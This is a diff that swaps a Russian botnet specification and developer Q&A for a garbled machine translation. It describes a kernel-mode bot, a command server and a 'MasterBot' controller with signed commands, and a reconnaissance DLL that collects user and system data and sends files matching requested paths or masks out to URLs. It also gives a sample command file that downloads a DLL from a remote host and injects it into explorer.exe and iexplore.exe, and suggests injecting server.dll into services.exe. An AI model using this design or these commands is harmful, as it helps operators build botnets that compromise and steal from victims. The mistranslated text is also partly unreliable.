@@ -1,161 +1,160 @@
-1) формат конфига. Бот ведь у нас трансформируется в сервер по команде. Значит
-общение сеовера с ботом происходит в формате, который вы сами задаете. Для отладки
-нам хорошо иметь возможность как то смотреть содержимое конфига, но лучше
-оптимизируйте его по безопасности и для своего удобства. 
+1) Format Config. Boat because we have transformed into a server on the pitch. So
+Communication server only with the bot comes in a format that you are asking. For debugging
+we are well able to look like the contents of the config, but better
+optimize its safety and for your convenience.
 
-2) остальные вопросы на свое усмотрение. Все, что хотел отразили в ТЗ.
-Давай сначала по нему сделаем базу а потом будем накручивать. Сейчас уйдем в
-обсуждению юзерагентов какие надо поставить а бота, сервера, мастербота еще нет. GET
-или POST пусть решает прогер. 
+2) other matters at its discretion. All that would be reflected in the TOR.
+Let's first make a base on it and then we'll cheat. Now we go into the
+yuzeragentov discuss what is necessary to put a bot server masterbota yet. GET
+POST, or let him decide cheater.
 
-Бот: умеет получать от сервера файлы на запись в vfs и запуск, умеет удалять файлы
-из vfs, умеет возвращать содержимое vfs (сообщить серверу какие dll успешно
-подгружены), имеет уникальный айди, который может передать в dll ( например
-посредством файла 1726353.bid (bot id) который лежит в  vfs), умеет по списку
-серверов через заданные интервалы получить инструкции, умеет инициировать инжект 
-dll (находящихся в vfs) в процессы. 
+Boat : able to receive files from the server to write to the vfs and run , can delete files
+of vfs, can return the content vfs ( tell the server what dll successfully
+loading ) , has a unique Haydee , who can transfer dll ( eg
+through file 1726353.bid (bot id) which is at the vfs), is able to list
+server at specified intervals to receive instructions , can initiate inject
+dll ( located in the vfs) in the process .
 
-Сервер: получает от бота информацию, записывает в БД, получает от МастерБота
-инструкции для ботов (фактически для каждого бота своя инструкция, тк БД обновляется
-и в обновленной БД у определенного бота какой то файл может быть удален, а какой то
-добавлен), возвращает МастерБоту дамп БД для анализа и свой sid (server id). Кстати,
-БД можно хранить и на vfs (работать с ней) и просто передавать ее МастерБоту и,
-получив от МастерБота новую перезаписать поверх старой. Надо только для БД
-версионность предусмотреть. 
+Server: receives from the bot information recorded in the database, receives MasterBota
+instructions for bots (in fact, for each boat has its own guide , maybe the database is updated
+and update the database at a particular bot which the file can be removed and which is
+added ) returns MasterBotu dump the database for analysis and a sid (server id). Incidentally,
+The database can be stored on the vfs ( work with) and simply transfer it MasterBotu and
+MasterBota received from new over the old one to overwrite . It is only necessary for the database
+provide versioning .
 
-МастерБот связывается с сервером, получает текущую БД, передает инструкции
-(фактически обновляет БД) для ботов, передает dll, которая есть в БД.
+MasterBot communicates with the server, gets the current database, instructs
+(Actually updates the database) for bots, transfers dll, which is in the database.
 
-МастерБот, получив БД от сервера выкладывает в свою локальную папку. C:\brownie_db\
-Для мастербота предусмотреть запуск с параметрами : айпи сервера, путь к БД, которую
-надо залить на целевой ip. Запускаем мастербот, с параметрами, он стучит по айпи,
-получет БД с сервера, передает свою, отключается. 
+MasterBot received from the database server lays out in its local folder. C: \ brownie_db \
+To provide masterbota start with parameters: ip server, the path to the database, which
+it is necessary to fill in the destination ip. Run masterbot with the parameters he knocks on the ip,
+poluchetsya database from the server transmits its disabled.
 
-Мы говорили, что общение сервера и бота зашифровано. При создании бота и сервера и
-мастербота надо их подписать сертификатом. Чтобы бот не слушался чужого сервера, а
-сервер не получил команды от чужого мастербота. Как этот момент защитить?
+We said that the communication server and encrypted bot. When you create a bot and server
+masterbota need them to sign the certificate. Bot did not listen to someone else's server,
+the server has not received instructions from someone else masterbota. As this moment to protect?
 
-В БД содержится: айди бота, содержимое vfs, дата последнего отстука. 
-Полагаю для каждого сервера определить максимальное число обслуживаемых ботов,
-например Nк, если на сервер стукнет бот которого нет в списке этих Nк, то сервер
-отобьет соединение. Зачем? 1) мы управляем нагрузкой, 2) передавать мастерботу БД
-где ограниченное число записей всегда быстрей. 3) МастерБот будет сам удалять из БД
-старые боты. 
+The database contains: Haydee bot contents vfs, date of last otstuk .
+I think for each server to determine the maximum number of serviced bots ,
+Nk example , if the server banging bot is not in the list of Nk , the server
+will block the connection. What For? 1 ) we manage stress , 2 ) to transfer the database masterbotu
+where a limited number of records is always faster . 3 ) MasterBot itself will be removed from the database
+old boots .
 
-Если есть свободный прогер, то можем сделать небольшую dll для сбора инфо о целевой
-системе. Дабы не вшивать это в лоадер. Что будет уметь:
+If there is a free cheater , then we can make a small dll to collect information about the target
+system. In order not to sew it into the loader . 
 
-- при создании зашиваем в него список урлов для остука
-- отстукивает при запуске и каждые N часов (задается в конфигураторе)
-- возвращает Список установленного в системе ПО
-- возвращает конфигурацию ПК
-- возвращает имя пользователя
-- возвращает язык системы
-- возвращает часовой пояс
-- обращается на url, запрашивает путь к файлу, который необходимо вернуть. 
-- обращается на url, запрашивает маску, возвращает список файлов, соответсвующих
-маске.
+What will be able to:
 
-
-
->недостаточно документации для использования
-
->в данный момент не понятно ( bk):
->1. как прикрепить к инсталеру и запустить произвольную длл ? в документации
->  kldr32.cfg  - конфигурационный файл для прикрепления DLL к 32х-битному
->драйверу.
->  kldr64.cfg  - конфигурационный файл для прикрепления DLL к 64х-битному
->драйверу.
->  demo32.dll  - 32х-битная демо-библиотека.
->  demo64.dll  - 64х-битная демо-библиотека.
-
->в проекте данные файлы отсутствуют, упоминаются только в readme.txt.
->возможно что-то было не добавлено в отданную версию
-Это устаревшая информация. Проект с использованием кернельного-бота подразумевает, что
- любая DLL будет загружена ботом из сети. Поэтом конфиг-файлы для сборки инсталлера не
- содержат информации для прикрепления DLL к драйверу.
-Сообщите, если такой функционал нужен, - сделаем соответствующие конфиги. 
-
->2. совсем не описана процедура раздачи конфига, при сборке задается
->kbot.ini, как его обновить в дальнейшем ?
- Конфиг файл для конкретного бота (или группы ботов) задается командой SET_CONFIG через MB.
- Бот запрашивает конфиг по таймеру (параметр ConfigPeriod в KBOT.INI). 
- Это такой же INI файл, он сохраняется ботом на VFS и используется в дальнейшем.
- Пример KBOT.INI в папке \BkBuild.
-
->в доке написано чем шифруется, и как формируется подпись, но каков формат
->передачи данных и как прикреплять подпись ?
- Подписать файл можно утилитой CT (BSRV\CT), либо, если секретный ключ прикреплен к MB32(64).EXE то
- файл подписывается автоматически, при загрузке его на сервер (команды SET_TASK и SET_CONFIG).
-
->то же самое с командами, не понятно как формировать текстовый файл и
->подписывать его,
- Текстовый файл формируется любым текстовым редактором. Кодировка - ANSI. Подписывается утилитой CT:
-	CT -s <секретный ключ> <исходный файл> <конечный файл>
- либо, если секретный ключ прикреплен к MB32(64).EXE то
- файл подписывается автоматически, при загрузке его на сервер (команды SET_TASK и SET_CONFIG).
-
->возможно ли загрузка нескольких файлов одновременно ? если да, каков
->формат команды ?
- нет, SET_TASK и SET_CONFIG загружают по одному файлу для бота или группы ботов.
- В файле команд может быть несколько команд, каждая должна начинаться с новой строки.
-
->возможно не предполагается эксплуатация без мастербота, но об этом еще
->ниже напишу.
-
->3.KBOT:  функция SET_INJECT <имя файла на VFS> <список процессов>
->не понятно что инжектит, dll, exe ? <список процессов> разделен запятыми ?
-
-пример файла команд:
-LOAD_FILE http://mydomain.com/myfile.dll my.dll	; загружает http://mydomain.com/myfile.dll и сохраняет 
-						;  под именем my.dll	
-SET_INJECT my.dll explorer.exe iexplore.exe	; задает инжект для MY.DLL в процессы explorer.exe и iexplore.exe
+- When creating sutured it to the list of URLs ostuka
+- Ticking off at the start and every N hours (specified in the configuration )
+- Returns a list of installed software
+- Returns the configuration PC
+- Returns the user name
+- Returns the system language
+- Returns the time zone
+- Drawn to the url, it requests a file path , which must be returned .
+- Drawn to the url, queries mask , returns a list of files to appropriate mask.
 
 
->сервер (SRV)
+> insufficient documentation for use
 
->1. не описан формат хранения данных сервера.
->документация:
->BASE <путь к файлу> - скачивает с сервера текущую базу данных клиентов и
->сохраяет её в указанный файл.
->пока не ясно что сохраняется в этой базе
- ID пользователя, время создания записи, время последнего отстука, IP и User-Agent создания записи, 
- IP и User-Agent последнего отстука, ID группы, текущий конфиг файл (имя, CRC32, дата установки), 
- текущий файл команд (имя, CRC32, дата установки).
-Сейчас база хранится во внутреннем формате сервера. Утилиту для конвертирования дадим с первым же апдейтом.
+> currently not clear (bk):
+> 1 . how to attach to and run arbitrary instaleru dll ? documentation
+> Kldr32.cfg - configuration file to attach to the DLL , 32- bit
+> driver.
+> Kldr64.cfg - configuration file for attachment DLL to a 64 -bit
+> driver.
+> Demo32.dll - 32- bit demo library .
+> Demo64.dll - the 64 -bit demo library .
+
+> project data files are missing , are mentioned only in the readme.txt.
+> maybe something was not added to the Suggested version
+This outdated information . The project is using kernelnogo bot implies that
+ Any DLL will be loaded from a bot network. Poet configuration files to build the installer does not
+ provide information to attach to the DLL driver.
+Let us know if this functionality is required, - make appropriate configs .
+
+> 2 . not describes how the distribution config , the assembly is set
+> kbot.ini, how to upgrade in the future?
+ Config file for a specific bot ( or group of bots ) is given by a team of SET_CONFIG MB.
+ Boat requests configuration timer (parameter ConfigPeriod in KBOT.INI).
+ This is the same INI file , it is stored in the bots VFS and used in the future.
+ Example KBOT.INI folder \ BkBuild.
  
->2.SET_CONFIG(SET_TASK) <ID> <имя файла на сервере> [лимит]
->MB.exe подпишет все сама  или руками надо будет каждый раз присоединять
->сертификаты ? к сожалению пока не смог собрать и посмотреть данную
->утилиту.
+> what is written in the dock is encrypted , and how a signature , but what format
+> Data and how to attach signature?
+ Sign the file can be a utility CT (BSRV \ CT), or if the secret key is attached to the MB32 ( 64 ) .EXE is
+ signed file automatically when loading it to the server ( and the team SET_TASK SET_CONFIG).
 
-Подпишет сама если к утилите был прикреплен секретный ключ. Это делается путем запуска bat-ника 
- bkbuild\bkbuild.bat.
+> the same with the teams , it is not clear how to shape the text file
+> sign it ,
+ A text file is generated with any text editor . Encoding - ANSI. Signed by the utility CT:
+CT -s < secret key > < source file > < output file >
+ or, if the private key is attached to the MB32 ( 64 ) .EXE is
+ signed file automatically when loading it to the server ( and the team SET_TASK SET_CONFIG).
+ 
+> Is it possible to download multiple files simultaneously? if so, what
+> Format command ?
+ No , SET_TASK SET_CONFIG and charged with one file or a group of bots bot .
+ The command file can be several teams, each must begin on a new line .
 
->очень не хватает примеров по командам. в случае если есть 1 машина то
->вроде все понятно, если их 10, необходимо к каждой присоединиться и дать
->команду через консоль ?
-Да. Если есть несколько серверов, то нужно прицепится к каждому по-очереди.
-Как сделать лучше?
+> may not be assumed without masterbota operation , but this is still
+> I write below .
 
->3. в п.2 для BK упоминал об работе без мастер бота.
->насколько я понимаю, после загрузки бота прогружается server.dll и как то
->запускается, в ней содержится конфиг для начальной работы, далее эта
->машина становится одновременно и клиентом, и сервером.
->клиентская часть позволяет обновить серверную, и обновить конфиг
->серверной. а серверная в свою очередь обеспечивает доступ к себе другим
->серверам.
- Всё верно. Можно задать инжект server.dll в какой-нибудь системный процесс, например в services.exe.
+> 3.KBOT: function SET_INJECT < file name on the VFS> < list of processes >
+> it is not clear that inject , dll, exe? < list of processes > comma ?
 
->в случае передачи данных на нижестоящий MB они же сохраняться в не
->подписанном виде, просто как файлы vfs ( конфиг или чтото иное )
->как вообще предполагается использовать  ? установка на "свои" сервера ? 
-Тут хотелось бы подробнее. Не понял вопрос.
+an example of the file:
+LOAD_FILE http://mydomain.com/myfile.dll my.dll; http://mydomain.com/myfile.dll loads and stores
+; under the name my.dll
+SET_INJECT my.dll explorer.exe iexplore.exe; asks to inject MY.DLL in the process explorer.exe and iexplore.exe
 
->на сколько понимаю у него должен быть полный комплект сертификатов для
->того чтобы раздавать конфиги и файлы,
->закачка на "чужую" машину будет безопасна ?"
-Предполагается, что файл либо подписывается на локальном компьютере оператора, либо,
- загружается на сервер утилитой MB.EXE, которая содержит секретный ключ, опять же, с 
- локального компьютера оператора.
- При такой схеме секетный ключ есть только на компьютере оператора.
+
+> server (SRV)
+> 1 . It does not describe the format of data storage server .
+> records:
+> BASE < path to file> - downloads from the current database server and clients
+> sohrayaet it to the specified file .
+> it is not clear that this is stored in the database
+ The user ID , the time the record was created , last otstuk , IP and User-Agent record was created ,
+ IP and User-Agent last otstuk , ID group , the current configuration file ( name , CRC32, installation date )
+ the current command file ( name , CRC32, installation date ) .
+Now the database is stored in an internal format of the server. Tool to Convert give with the first update.
+
+> 2.SET_CONFIG (SET_TASK) <ID> < name of the file on the server > [ limit ]
+> MB.exe sign all by herself or her hands each time will have to be attached
+> Certificates ? unfortunately I am not able to gather and see this
+> utility .
+
+Sign itself if the utility was attached a secret key. This is done by running the bat- nick
+ bkbuild \ bkbuild.bat.
+ 
+> are lacking in examples of the commands. if there is one car that
+> like everything is clear , if there are 10 , it is necessary to join and give each
+> command through the console ?
+Yes. If you have multiple servers , you need the trailer to each in turn.
+How to do better?
+
+> 3 . in paragraph 2 for BK mentioned the work without a master bot.
+> I understand that after loading the boat progruzhat server.dll and how that
+> start, it contains a configuration for the initial work , then this
+> vehicle becomes both client and server.
+> client side allows the server to upgrade and update the configuration
+> server . and the server , in turn, provides access to other currently
+> servers.
+ That's right . You can specify inject server.dll in any system process , such as services.exe.
+ 
+> in the case of data transfer to downstream MB are also stored in the non-
+> signed the form , just as files vfs ( config or something else )
+> How is it supposed to be used ? Install on " their " server ?
+Here I would like to read more . I did not understand the question.
+
+> to understand how he must have a complete set of certificates for
+> to distribute config files ,
+> download at " another " car will be safe ? "
+Assuming that the file or subscribes to the local computer operator , or,
+ uploaded to the server utility MB.EXE, which contains the secret key again, with
+ local computer operator .
+ Under this scheme seketny key only on the computer operator .
